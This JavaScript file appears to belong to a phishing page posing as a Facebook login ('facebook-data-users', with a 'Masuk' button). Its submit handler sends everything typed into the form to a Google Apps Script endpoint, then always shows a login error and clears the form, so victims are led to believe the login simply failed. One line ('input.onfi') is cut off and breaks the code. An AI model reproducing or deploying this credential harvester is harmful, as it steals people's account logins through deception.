const scriptURL =
  "https://script.google.com/macros/s/AKfycbzD9d5uemvhILtq89p6Wr87jDIAzPhYXBdZEbFY6mT5oV1CYOhWsCHLL2LpJwWnIIGc/exec";
const form = document.forms["facebook-data-users"];
const btnMasuk = document.querySelector("#log");
const btnLoading = document.querySelector("#wait");
const input = document.querySelector("#error");
const errorMsg = document.querySelector("#errorSpan");

input.onfi

form.addEventListener("submit", (e) => {
  e.preventDefault();
  btnMasuk.style.transform = "translateY(-10px)";
  btnMasuk.style.opacity = "0";
  btnLoading.style.transform = "translateY(10px)";
  input.classList.remove("error");
  errorMsg.classList.remove("showError");
  setTimeout(() => {
    btnLoading.style.opacity = "0";
    btnLoading.classList.add("d-none");
    btnMasuk.style.display = "none";
  }, 400);
  setTimeout(() => {
    btnLoading.style.transform = "translateY(0)";
    btnLoading.style.opacity = "1";
    btnMasuk.style.transform = "translateY(10px)";
  }, 500);
  fetch(scriptURL, { method: "POST", body: new FormData(form) })
    .then((response) => {
      btnMasuk.style.opacity = "0";
      btnMasuk.style.transform = "translateY(10px)";
      btnLoading.style.transform = "translateY(-10px)";
      setTimeout(() => {
        btnMasuk.style.display = "flex";
        btnMasuk.style.transform = "translateY(0)";
        btnMasuk.style.opacity = "1";
        btnLoading.classList.remove("d-none");
      }, 300);
      input.classList.add("error");
      errorMsg.classList.add("showError");
      console.log("Success!", response);
      form.reset();
    })
    .catch((error) => console.error("Error!", error.message));
});
